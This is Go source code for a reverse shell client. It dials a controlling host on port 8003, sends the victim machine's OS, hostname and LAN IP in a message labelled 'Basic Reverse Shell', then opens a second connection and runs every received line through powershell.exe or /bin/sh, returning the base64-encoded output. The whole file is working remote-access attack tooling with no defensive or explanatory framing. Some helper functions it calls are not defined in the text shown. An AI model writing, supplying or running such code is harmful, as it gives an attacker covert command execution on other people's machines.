package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

var HOST_IP string = GetOutboundIP() //"192.168.3.6"

func main() {
	connectPort := GetPort()
	if connectPort == "-1" {
		return
	}
	EstablishConnection(connectPort)
}

func GetPort() string {
	//Get the reverse shell port from the server
	getPort, err := net.Dial("tcp", HOST_IP+":8003")
	if err != nil {
		fmt.Println("Couldn't get connection")
		return "-1"
	}
	defer getPort.Close()
	// ip := GetOutboundIP()
	osFlavor := "n/a"
	// TODO: add OS flavor
	if runtime.GOOS == "linux" {
		osFlavor = getOS()
	} else if runtime.GOOS == "windows" {
		cmd := exec.Command("wmic", "os", "get", "Caption")
		out, _ := cmd.Output()
		osFlavor = string(out)
		osFlavor = osFlavor[strings.Index(osFlavor, "\n")+1:]
		osFlavor = trim(osFlavor[:strings.Index(osFlavor, "\n")])
		cmd.Run()
	}
	hostname := getHostname()
	it, err := getPort.Write([]byte(
		"INFO:{clientType:Basic Reverse Shell," +
			"lanIP:" + GetOutboundIP() + "," +
			"isEncoded:true" + "," +
			"os:" + runtime.GOOS + "," +
			"osFlavor:" + osFlavor + "," +
			"hostname:" + hostname +
			"}\n",
	))
	if err != nil {
		fmt.Println(err.Error())
		fmt.Println(it)
	}
	port, _ := bufio.NewReader(getPort).ReadString('\n')
	return port
}
func EstablishConnection(port string) {
	//Establish reverse connection to host
	conn, _ := net.Dial("tcp", HOST_IP+":"+port)
	var cmd *exec.Cmd
	reader := bufio.NewReader(conn)
	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		args := strings.Split(command, " ")
		if args[0] == "cd" {
			os.Chdir(trim(command[3:]))
			conn.Write([]byte("\n"))
		} else {
			if runtime.GOOS == "windows" {
				cmd = exec.Command("powershell.exe", command)
			} else {
				cmd = exec.Command("/bin/sh", command)
			}
			out, _ := cmd.Output()
			conn.Write([]byte(b64_encode(string(out)) + "\n"))
			cmd.Run()
		}

		// fmt.Println(string(out))

		//Set input/output to the established connection's in/out
	}
}
